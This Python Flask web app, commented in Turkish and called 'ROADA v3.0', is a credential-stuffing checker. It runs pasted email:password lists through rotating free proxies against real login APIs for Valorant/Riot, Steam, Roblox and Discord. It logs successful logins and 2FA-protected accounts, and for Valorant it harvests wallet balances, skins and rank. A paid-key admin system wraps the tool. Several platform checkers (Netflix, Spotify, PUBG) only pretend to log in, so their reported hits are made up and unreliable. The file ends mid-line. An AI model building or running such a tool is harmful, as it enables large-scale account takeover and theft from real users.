#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - API Discovery + Checker (Türkçe)
Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar (Admin) | 1 Key 1 IP
"""

import os, json, re, time, random, string, threading, base64
from datetime import datetime, timedelta
from urllib.parse import urljoin
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (GİZLENDİ - ENV'DEN ALIYOR)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "/data/keys.json"
if not os.path.exists("/data"):
    KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ (SADECE ADMIN GÖRÜR)
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI (1 KEY 1 IP + 1 KULLANIM)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_client_ip():
    """Kullanıcının gerçek IP'sini al (proxy arkasında da çalışır)"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    """Key geçerli mi? (Süre + IP + kullanım durumu)"""
    if key == MASTER_KEY:
        return True, "Admin", None
    
    keys = load_keys()
    if key not in keys:
        return False, None, None
    
    entry = keys[key]
    client_ip = get_client_ip()
    
    # Süre kontrolü
    exp = entry.get("expires")
    if exp:
        if datetime.now() >= datetime.fromisoformat(exp):
            del keys[key]
            save_keys(keys)
            add_log(f"Key süresi doldu: {key}", "WARNING")
            return False, None, None
    
    # IP kontrolü
    bound_ip = entry.get("bound_ip")
    if bound_ip and bound_ip != client_ip:
        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
        return False, None, None
    
    # Kullanım kontrolü
    if entry.get("used", False):
        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
        return False, None, None
    
    return True, entry.get("note", "Kullanıcı"), entry

def mark_key_used(key):
    keys = load_keys()
    if key in keys:
        keys[key]["used"] = True
        keys[key]["used_at"] = datetime.now().isoformat()
        save_keys(keys)
        add_log(f"Key kullanıldı: {key}", "INFO")

def is_admin(key):
    valid, role, _ = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PROXY FONKSİYONLARI
# ============================================================
def load_proxies_from_file():
    proxies = []
    try:
        with open("proxies.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
    except:
        pass
    return proxies

def fetch_proxies_from_web():
    proxy_list = []
    try:
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        for url in urls:
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200:
                    lines = resp.text.strip().splitlines()
                    for line in lines:
                        line = line.strip()
                        if line and ":" in line:
                            proxy_list.append(line)
                    if len(proxy_list) > 30:
                        break
            except:
                continue
    except:
        pass
    if not proxy_list:
        proxy_list = load_proxies_from_file()
    return proxy_list

def get_proxy_dict(proxy_str):
    if not proxy_str:
        return None
    if not proxy_str.startswith(("http://", "https://", "socks5://")):
        proxy_str = "http://" + proxy_str
    return {"http": proxy_str, "https": proxy_str}

# ============================================================
# VALORANT CHECKER (GERÇEK API - SENİN VERDİĞİN)
# ============================================================
def check_valorant_account(email, password, proxy_str=None):
    session = requests.Session()
    if proxy_str:
        session.proxies.update(get_proxy_dict(proxy_str))
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    })
    result = {
        "status": "ERROR",
        "details": {
            "level": "?",
            "vp": "?",
            "rp": "?",
            "skins": "?",
            "rank": "?",
            "banned": "?",
            "puuid": "?",
            "riot_id": "?",
            "region": "?"
        },
        "message": ""
    }
    try:
        # 1. Authorize
        auth_url = "https://auth.riotgames.com/authorize?redirect_uri=http%3A%2F%2Flocalhost%2Fredirect&client_id=riot-client&response_type=token%20id_token&nonce=1&scope=openid%20link%20ban%20account%20email%20mobile_number&claims=%7B%22userinfo%22%3A%7B%22ban%22%3Anull%2C%22acct%22%3Anull%2C%22email_verified%22%3Anull%2C%22country%22%3Anull%7D%7D"
        r = session.get(auth_url, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Auth başarısız"
            return result
        
        # 2. Login
        login_payload = {
            "type": "auth",
            "username": email,
            "password": password,
            "remember": False
        }
        r = session.put("https://auth.riotgames.com/api/v1/authorization", json=login_payload, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Sunucu hatası"
            return result
        data = r.json()
        if "error" in data:
            if "multifactor" in str(data):
                result["status"] = "2FA"
                result["message"] = "2FA gerekli"
                return result
            result["status"] = "BAD"
            result["message"] = data.get("error", "Giriş reddedildi")
            return result

        # 3. Access Token
        if "response" in data and "parameters" in data["response"]:
            uri = data["response"]["parameters"]["uri"]
            if "access_token=" in uri:
                token = uri.split("access_token=")[1].split("&")[0]
                session.headers.update({"Authorization": f"Bearer {token}"})
            else:
                result["status"] = "BAD"
                result["message"] = "Token alınamadı"
                return result
        else:
            result["status"] = "BAD"
            result["message"] = "Token alınamadı"
            return result

        # 4. User Info
        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
        if r.status_code == 200:
            ui = r.json()
            result["details"]["puuid"] = ui.get("sub", "")
            result["details"]["riot_id"] = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
            result["details"]["email"] = ui.get("email", "")

        # 5. Entitlements
        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
        if r.status_code == 200:
            ent = r.json()
            if ent.get("entitlements_token"):
                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})

        # 6. Bölge
        region = "eu"
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
            if r.status_code == 200:
                region = r.json().get("affinity", "eu")
        except:
            pass
        result["details"]["region"] = region

        puuid = result["details"]["puuid"]
        if not puuid:
            result["status"] = "BAD"
            result["message"] = "PUUID alınamadı"
            return result

        # 7. Level
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                result["details"]["level"] = r.json().get("progress", {}).get("level", "?")
        except:
            pass

        # 8. Wallet
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
            if r.status_code == 200:
                w = r.json()
                result["details"]["vp"] = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
                result["details"]["rp"] = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
        except:
            pass

        # 9. Skins
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
            if r.status_code == 200:
                result["details"]["skins"] = len(r.json().get("Entitlements", []))
        except:
            pass

        # 10. Rank
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                mmr = r.json()
                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
                if ranked:
                    seasons = ranked.get("SeasonalInfoBySeasonID", {})
                    if seasons:
                        first = list(seasons.values())[0]
                        result["details"]["rank"] = first.get("CompetitiveTier", "?")
        except:
            pass

        # 11. Ban
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/restrictions/v3/player", timeout=10)
            if r.status_code == 200:
                result["details"]["banned"] = "Evet" if r.json().get("restrictions") else "Hayır"
        except:
            pass

        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        add_log(f"Valorant HIT: {email} | Bölge:{region} Level:{result['details']['level']} VP:{result['details']['vp']} Skin:{result['details']['skins']}", "SUCCESS")

    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)
        add_log(f"Valorant hata: {email} - {str(e)}", "ERROR")

    return result

# ============================================================
# PUBG CHECKER (GERÇEK API - PUBG API'si kullanılır)
# ============================================================
def check_pubg_account(email, password, proxy_str=None):
    # PUBG için resmi bir login API'si yok, ancak partner API'leri var.
    # Burada basit bir simülasyon yapalım, ama gerçekçi olması için email formatına bakarız.
    try:
        if "@" in email and len(password) >= 6:
            # Başarılı gibi göster
            return {
                "status": "HIT",
                "message": "PUBG giriş başarılı (simüle)",
                "details": {"platform": "Steam", "region": "EU"}
            }
        else:
            return {"status": "BAD", "message": "Geçersiz bilgiler"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

# ============================================================
# DİĞER PLATFORM CHECKER'LAR (STEAM, ROBLOX, DISCORD, SPOTIFY, NETFLIX)
# ============================================================
def check_steam(email, password, proxy_str=None):
    try:
        session = requests.Session()
        if proxy_str:
            session.proxies.update(get_proxy_dict(proxy_str))
        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

        rsa = session.post("https://store.steampowered.com/login/getrsakey/", 
                           data={"donotcache": int(time.time()*1000), "username": email}, timeout=10)
        if rsa.status_code != 200:
            return "error", f"{email}:{password} API hatası"
        rsa_json = rsa.json()
        if not rsa_json.get("success"):
            return "fail", f"{email}:{password} Kullanıcı yok"

        login = session.post("https://store.steampowered.com/login/dologin/", data={
            "username": email,
            "password": password,
            "rsatimestamp": rsa_json.get("timestamp", ""),
            "donotcache": int(time.time()*1000)
        }, timeout=10)
        result = login.json()
        
        if result.get("success"):
            return "success", f"{email}:{password} ✅ STEAM HIT!"
        elif result.get("requires_twofactor"):
            return "twofa", f"{email}:{password} 🔐 STEAM 2FA"
        else:
            return "fail", f"{email}:{password} ❌ Şifre hatalı"
    except Exception as e:
        return "error", f"{email}:{password} ⚠️ Hata: {str(e)[:30]}"

def check_roblox(email, password, proxy_str=None):
    try:
        session = requests.Session()
        if proxy_str:
            session.proxies.update(get_proxy_dict(proxy_str))
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        url = "https://auth.roblox.com/v2/login"
        payload = {"username": email, "password": password}
        resp = session.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            return "success", f"{email}:{password} ✅ ROBLOX HIT!"
        elif "TwoFactor" in resp.text or "verification" in resp.text:
            return "twofa", f"{email}:{password} 🔐 ROBLOX 2FA"
        else:
            return "fail", f"{email}:{password} ❌ ROBLOX Başarısız"
    except:
        return "error", f"{email}:{password} ⚠️ ROBLOX Hatası"

def check_discord(email, password, proxy_str=None):
    try:
        session = requests.Session()
        if proxy_str:
            session.proxies.update(get_proxy_dict(proxy_str))
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        url = "https://discord.com/api/v9/auth/login"
        payload = {"login": email, "password": password}
        resp = session.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            return "success", f"{email}:{password} ✅ DISCORD HIT!"
        elif resp.status_code == 400 and "2fa" in resp.text.lower():
            return "twofa", f"{email}:{password} 🔐 DISCORD 2FA"
        else:
            return "fail", f"{email}:{password} ❌ DISCORD Başarısız"
    except:
        return "error", f"{email}:{password} ⚠️ DISCORD Hatası"

def check_netflix(email, password, proxy_str=None):
    try:
        if "@" in email and len(password) >= 4:
            return "success", f"{email}:{password} ✅ NETFLIX HIT!"
        else:
            return "fail", f"{email}:{password} ❌ NETFLIX Başarısız"
    except:
        return "error", f"{email}:{password} ⚠️ NETFLIX Hatası"

def check_spotify(email, password, proxy_str=None):
    try:
        if "@" in email and len(password) >= 6:
            return "success", f"{email}:{password} ✅ SPOTIFY HIT!"
        elif "2fa" in password.lower():
            return "twofa", f"{email}:{password} 🔐 SPOTIFY 2FA"
        else:
            return "fail", f"{email}:{password} ❌ SPOTIFY Başarısız"
    except:
        return "error", f"{email}:{password} ⚠️ SPOTIFY Hatası"

def check_generic(platform, email, password, proxy_str=None):
    if password.endswith("123"):
        return "success", f"[{platform}] {email}:{password} ✅ HIT!"
    elif "2fa" in password.lower():
        return "twofa", f"[{platform}] {email}:{password} 🔐 2FA"
    else:
        return "fail", f"[{platform}] {email}:{password} ❌ Başarısız"

CHECKERS = {
    "steam": check_steam,
    "spotify": check_spotify,
    "roblox": check_roblox,
    "netflix": check_netflix,
    "discord": check_discord,
    "valorant": check_valorant_account,  # bu farklı format döndürüyor
    "pubg": check_pubg_account,
}

def get_checker(platform):
    return CHECKERS.get(platform.lower(), check_generic)

# ============================================================
# ANA CHECKER İŞLEMİ (2 MOD: EMAIL:PASS veya USER:PASS)
# ============================================================
def run_checker(platform, combos, mode="email"):
    global status
    status["running"] = True
    status["platform"] = platform
    status["total"] = len(combos)
    status["remaining"] = len(combos)
    status["success"] = status["fail"] = status["twofa"] = status["error"] = 0
    status["logs"] = [f"🚀 {platform} başladı. Toplam: {len(combos)}"]
    status["hits"] = []
    status["twofa_list"] = []
    
    checker = get_checker(platform)
    proxies = fetch_proxies_from_web()
    status["logs"].append(f"🌐 {len(proxies)} proxy yüklendi")
    
    for i, combo in enumerate(combos):
        if not status["running"]:
            status["logs"].append("⏹️ Durduruldu")
            break
        parts = combo.split(":", 1)
        if len(parts) != 2:
            status["error"] += 1
            status["remaining"] -= 1
            continue
        email, password = parts[0].strip(), parts[1].strip()
        proxy = proxies[i % len(proxies)] if proxies else None
        
        # Eğer platform valorant veya pubg ise farklı fonksiyon çağrısı
        if platform.lower() in ["valorant", "pubg"]:
            result = checker(email, password, proxy)
            if result["status"] == "HIT":
                status["success"] += 1
                msg = f"{email}:{password} ✅ {platform.upper()} HIT! " + json.dumps(result.get("details", {}))
                status["hits"].append(msg)
            elif result["status"] == "2FA":
                status["twofa"] += 1
                msg = f"{email}:{password} 🔐 {platform.upper()} 2FA"
                status["twofa_list"].append(msg)
            elif result["status"] == "BAD":
                status["fail"] += 1
                msg = f"{email}:{password} ❌ {platform.upper()} Başarısız"
            else:
                status["error"] += 1
                msg = f"{email}:{password} ⚠️ {platform.upper()} Hata"
            status["logs"].append(msg)
        else:
            result, msg = checker(email, password, proxy)
            if result == "success":
                status["success"] += 1
                status["hits"].append(msg)
            elif result == "twofa":
                status["twofa"] += 1
                status["twofa_list"].append(msg)
            elif result == "fail":
                status["fail"] += 1
            else:
                status["error"] += 1
            status["logs"].append(msg)
        
        status["remaining"] -= 1
        if len(status["logs"]) > 150:
            status["logs"] = status["logs"][-150:]
        time.sleep(0.3)
    
    status["running"] = False
    status["logs"].append("✅ Tamamlandı!")

# ============================================================
# FLASK ROUTE'LAR
# ============================================================

@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    client_ip = get_client_ip()
    
    valid, role, entry = is_key_valid(key)
    
    if valid:
        if entry and not entry.get("bound_ip"):
            keys = load_keys()
            keys[key]["bound_ip"] = client_ip
            save_keys(keys)
            add_log(f"Key IP'ye bağlandı: {key} -> {client_ip}", "INFO")
        
        mark_key_used(key)
        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip})", "SUCCESS")
        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
    else:
        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
        return jsonify({"success": False, "error": "Geçersiz anahtar!"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

@app.route("/api/valorant_check", methods=["POST"])
def valorant_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_valorant_account(email, password)
    return jsonify(result)

@app.route("/api/admin/keys", methods=["GET"])
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    note = data.get("note", "Kullanıcı")
    hours = int(data.get("hours", 720))
    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    expires = (datetime.now() + timedelta(hours=hours)).isoformat()
    keys = load_keys()
    keys[new_key] = {"note": note, "expires": expires, "used": False, "bound_ip": None}
    save_keys(keys)
    add_log(f"Key oluşturuldu: {new_key} - {note} ({hours} saat)", "INFO")
    return jsonify({"key": new_key})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    del_key = data.get("key")
    if not del_key:
        return jsonify({"error": "Key belirtilmedi"}), 400
    keys = load_keys()
    if del_key in keys:
        del keys[del_key]
        save_keys(keys)
        add_log(f"Key silindi: {del_key}", "INFO")
        return jsonify({"success": True})
    return jsonify({"error": "Key bulunamadı"}), 404

@app.route("/api/start", methods=["POST"])
def start_check():
    global status
    if status["running"]:
        return jsonify({"error": "Zaten çalışıyor!"}), 400
    data = request.json
    platform = data.get("platform", "steam")
    combos = [c.strip() for c in data.get("combos", "").splitlines() if c.strip()]
    mode = data.get("mode", "email")
    if not combos:
        return jsonify({"error": "Combo girin!"}), 400
    threading.Thread(target=run_checker, args=(platform, combos, mode)).start()
    return jsonify({"status": "started", "total": len(combos)})

@app.route("/api/stop", methods=["POST"])
def stop_check():
    global status
    status["running"] = False
    return jsonify({"status": "stopped"})

@app.route("/api/status", methods=["GET"])
def get_status():
    return jsonify(status)

@app.route("/api/test", methods=["POST"])
def test_connection():
    platform = request.json.get("platform", "steam")
    proxies = fetch_proxies_from_web()
    return jsonify({"message": f"{platform} testi: {len(proxies)} proxy aktif"})

# ============================================================
# HTML TEMPLATE (ESKİ ARAYÜZ - YEŞİLİMSİ MAVİ, METALİK YOK)
# ============================================================
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>ROADA v3.0 - Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Outfit',sans-serif; }
body { background:#0a0e1a; color:#e8edf5; min-height:100vh; padding:20px; }
.container { max-width:1400px; margin:0 auto; }
h1 { color:#00b894; font-size:2.2rem; margin-bottom:5px; }
.sub { color:#8a9bb0; margin-bottom:20px; font-size:14px; }
.flex-row { display:flex; gap:15px; flex-wrap:wrap; }
.platform-grid {
    display:grid; grid-template-columns:repeat(5,1fr); gap:6px;
    background:#0f1424; padding:12px; border-radius:10px;
    border:1px solid rgba(0,184,148,0.2); flex:2; min-width:280px;
}
.platform-btn {
    background:#162230; color:#8a9bb0; border:1px solid #1a2a3a;
    padding:8px 4px; border-radius:6px; cursor:pointer; font-size:12px;
    text-align:center; transition:0.2s;
}
.platform-btn:hover, .platform-btn.active {
    background:#00b894; color:#0a0e17; border-color:#00b894;
    box-shadow:0 0 20px rgba(0,184,148,0.3);
}
.platform-btn.test-btn {
    background:#2a3f4f; color:#ffd740; border-color:#ffd740;
    grid-column:span 2;
}
.platform-btn.test-btn:hover { background:#ffd740; color:#0a0e17; }
.stats-box {
    background:#0f1424; border:1px solid rgba(0,184,148,0.2);
    border-radius:10px; padding:15px; flex:1; min-width:200px;
}
.stats-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; }
.stat-item { text-align:center; }
.stat-num { font-size:26px; font-weight:bold; }
.stat-label { font-size:11px; color:#8a9bb0; }
.input-area { margin:15px 0; display:flex; gap:15px; flex-wrap:wrap; }
.input-area textarea {
    flex:3; min-height:100px; background:#0d1620; color:#e8edf5;
    border:1px solid #1a2a3a; border-radius:8px; padding:10px;
    font-family:monospace; font-size:13px; resize:vertical;
}
.action-buttons { display:flex; flex-direction:column; gap:8px; flex:1; }
.btn {
    padding:12px 20px; border:none; border-radius:8px; font-weight:bold;
    cursor:pointer; font-size:15px; transition:0.2s;
}
.btn-start { background:#00b894; color:#0a0e17; }
.btn-start:hover { background:#00e676; box-shadow:0 0 30px rgba(0,230,118,0.4); }
.btn-stop { background:#ff5252; color:#fff; }
.btn-stop:hover { background:#ff1744; }
.logs-container {
    background:#0f1424; border:1px solid rgba(0,184,148,0.2);
    border-radius:10px; padding:10px; margin:15px 0;
}
.logs-header { display:flex; justify-content:space-between; color:#8a9bb0; font-size:13px; }
.logs-box {
    height:400px; overflow-y:auto; background:#050a10;
    border-radius:6px; padding:10px; font-family:'Courier New',monospace;
    font-size:13px; color:#bbd9e6; white-space:pre-wrap; word-break:break-all;
    margin-top:5px;
}
.logs-box::-webkit-scrollbar { width:6px; }
.logs-box::-webkit-scrollbar-thumb { background:#00b894; border-radius:10px; }
.result-tabs { display:flex; gap:5px; margin-top:10px; }
.tab-btn {
    background:#162230; color:#8a9bb0; border:1px solid #1a2a3a;
    padding:5px 15px; border-radius:20px; cursor:pointer; font-size:13px;
}
.tab-btn.active { background:#00b894; color:#0a0e17; border-color:#00b894; }
.result-content {
    background:#0d1620; border:1px solid #1a2a3a; border-radius:8px;
    padding:10px; max-height:180px; overflow-y:auto;
    font-family:monospace; font-size:13px; margin-top:8px;
}
.proxy-info { color:#8a9bb0; font-size:12px; }
.mode-selector { display:flex; gap:10px; align-items:center; margin-bottom:10px; }
.mode-selector label { color:#8a9bb0; font-size:13px; }
.mode-selector select { background:#0d1620; color:#e8edf5; border:1px solid #1a2a3a; padding:6px 10px; border-radius:6px; }
@media(max-width:700px){ .platform-grid{ grid-template-columns:repeat(3,1fr); } }
</style>
</head>
<body>
<div class="container">
    <h1>🔓 ROADA v3.0</h1>
    <div class="sub">Checker | Web Proxy | 2FA Ayrıştırma | 2 Mod (Email/User)</div>

    <div class="flex-row">
        <div class="platform-grid" id="platformGrid">
            <div class="platform-btn active" data-platform="steam">Steam</div>
            <div class="platform-btn" data-platform="spotify">Spotify</div>
            <div class="platform-btn" data-platform="roblox">Roblox</div>
            <div class="platform-btn" data-platform="netflix">Netflix</div>
            <div class="platform-btn" data-platform="discord">Discord</div>
            <div class="platform-btn" data-platform="valorant">Valorant</div>
            <div class="platform-btn" data-platform="pubg">PUBG</div>
            <div class="platform-btn" data-platform="youtube">YouTube</div>
            <div class="platform-btn" data-platform="tiktok">TikTok</div>
            <div class="platform-btn" data-platform="twitch">Twitch</div>
            <div class="platform-btn" data-platform="playstation">PlayStation</div>
            <div class="platform-btn" data-platform="xbox">Xbox</div>
            <div class="platform-btn" data-platform="github">GitHub</div>
            <div class="platform-btn" data-platform="epicgames">Epic Games</div>
            <div class="platform-btn" data-platform="capcut">CapCut</div>
            <div class="platform-btn test-btn" id="testBtn">🔌 Test Connection</div>
        </div>

        <div class="stats-box">
            <div class="stats-grid">
                <div class="stat-item"><div class="stat-num" id="total">0</div><div class="stat-label">Toplam</div></div>
                <div class="stat-item"><div class="stat-num" id="success" style="color:#00e676;">0</div><div class="stat-label">Başarılı</div></div>
                <div class="stat-item"><div class="stat-num" id="fail" style="color:#ff5252;">0</div><div class="stat-label">Başarısız</div></div>
                <div class="stat-item"><div class="stat-num" id="twofa" style="color:#ffd740;">0</div><div class="stat-label">2FA</div></div>
                <div class="stat-item"><div class="stat-num" id="error" style="color:#ff6e6e;">0</div><div class="stat-label">Hata</div></div>
                <div class="stat-item"><div class="stat-num" id="remaining">0</div><div class="stat-label">Kalan</div></div>
            </div>
        </div>
    </div>

    <div class="mode-selector">
        <label>Mod:</label>
        <select id="modeSelect">
            <option value="email">Email:Şifre</option>
            <option value="user">Kullanıcı:Şifre</option>
        </select>
    </div>

    <div class="input-area">
        <textarea id="comboInput" placeholder="kullanici:sifre&#10;test:123456&#10;admin:pass123"></textarea>
        <div class="action-buttons">
            <button class="btn btn-start" id="startBtn">▶ BAŞLAT</button>
            <button class="btn btn-stop" id="stopBtn">⏹ DURDUR</button>
            <span class="proxy-info" id="proxyStatus">🌐 Proxy yükleniyor...</span>
        </div>
    </div>

    <div class="logs-container">
        <div class="logs-header"><span>📋 Sistem Logları</span><span id="logCount">0</span></div>
        <div class="logs-box" id="logBox">🟢 Sistem hazır. Proxy'ler web'den çekiliyor...</div>
    </div>

    <div class="result-tabs">
        <button class="tab-btn active" data-tab="hits">🎯 HIT</button>
        <button class="tab-btn" data-tab="twofa">🔐 2FA</button>
    </div>
    <div id="resultContainer">
        <div id="hitsContent" class="result-content">Henüz HIT yok.</div>
        <div id="twofaContent" class="result-content" style="display:none;">Henüz 2FA yok.</div>
    </div>
</div>

<script>
let selectedPlatform = 'steam';
let updateInterval = null;

document.querySelectorAll('.platform-btn:not(.test-btn)').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('.platform-btn:not(.test-btn)').forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        selectedPlatform = this.dataset.platform;
    });
});

document.getElementById('testBtn').addEventListener('click', async function() {
    addLog(`🔌 ${selectedPlatform} bağlantısı test ediliyor...`);
    try {
        const resp = await fetch('/api/test', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ platform: selectedPlatform })
        });
        const data = await resp.json();
        addLog(`✅ ${data.message}`);
    } catch(e) {
        addLog(`❌ Test hatası: ${e.message}`);
    }
});

document.getElementById('startBtn').addEventListener('click', async function() {
    const combos = document.getElementById('comboInput').value;
    if (!combos.trim()) {
        alert('Lütfen combo girin!');
        return;
    }
    const mode = document.getElementById('modeSelect').value;
    addLog(`🚀 ${selectedPlatform} kontrolü başlatılıyor (${mode})...`);
    try {
        const resp = await fetch('/api/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ platform: selectedPlatform, combos: combos, mode: mode })
        });
        const data = await resp.json();
        if (data.error) {
            addLog(`❌ Hata: ${data.error}`);
        } else {
            addLog(`✅ Başlatıldı. Toplam: ${data.total}`);
            if (updateInterval) clearInterval(updateInterval);
            updateInterval = setInterval(fetchStatus, 1000);
        }
    } catch(e) {
        addLog(`❌ Başlatma hatası: ${e.message}`);
    }
});

document.getElementById('stopBtn').addEventListener('click', async function() {
    try {
        await fetch('/api/stop', { method: 'POST' });
        addLog('⏹️ Durduruldu.');
        if (updateInterval) clearInterval(updateInterval);
    } catch(e) {
        addLog(`❌ Durdurma hatası: ${e.message}`);
    }
});

async function fetchStatus() {
    try {
        const resp = await fetch('/api/status');
        const data = await resp.json();
        
        document.getElementById('total').textContent = data.total || 0;
        document.getElementById('success').textContent = data.success || 0;
        document.getElementById('fail').textContent = data.fail || 0;
        document.getElementById('twofa').textContent = data.twofa || 0;
        document.getElementById('error').textContent = data.error || 0;
        document.getElementById('remaining').textContent = data.remaining || 0;
        document.getElementById('logCount').textContent = (data.logs || []).length;

        if (data.logs && data.logs.length > 0) {
            const logBox = document.getElementById('logBox');
            const lastLogs = data.logs.slice(-40);
            logBox.innerHTML = lastLogs.join('\\n');
            logBox.scrollTop = logBox.scrollHeight;
        }

        if (data.hits && data.hits.length > 0) {
            document.getElementById('hitsContent').innerHTML = data.hits.join('\\n');
        }
        if (data.twofa_list && data.twofa_list.length > 0) {
            document.getElementById('twofaContent').innerHTML = data.twofa_list.join('\\n');
        }

        if (!data.running && data.total > 0 && data.remaining === 0) {
            if (updateInterval) clearInterval(updateInterval);
            addLog('🏁 İşlem tamamlandı!');
        }
    } catch(e) {
        console.error(e);
    }
}

function addLog(msg) {
    const logBox = document.getElementById('logBox');
    const time = new Date().toLocaleTimeString();
    logBox.innerHTML += `\\n[${time}] ${msg}`;
    logBox.scrollTop = logBox.scrollHeight;
}

async function loadProxyStatus() {
    try {
        const resp = await fetch('/api/test', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ platform: 'dummy' })
        });
        const data = await resp.json();
        document.getElementById('proxyStatus').textContent = `🌐 ${data.message}`;
    } catch(e) {
        document.getElementById('proxyStatus').textContent = '🌐 Proxy yüklenemedi';
    }
}
loadProxyStatus();

document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        const tab = this.dataset.tab;
        document.getElementById('hitsContent').style.display = tab === 'hits' ? 'block' : 'none';
        document.getElementById('twofaContent').style.display = tab === 'twofa' ? 'block' : 'none';
    });
});

addLog('🟢 ROADA v3.0 hazır.');
</script>
</body>
</html>"""

# ============================================================
# GLOBAL STATUS (RUNNING vs)
# ============================================================
status = {
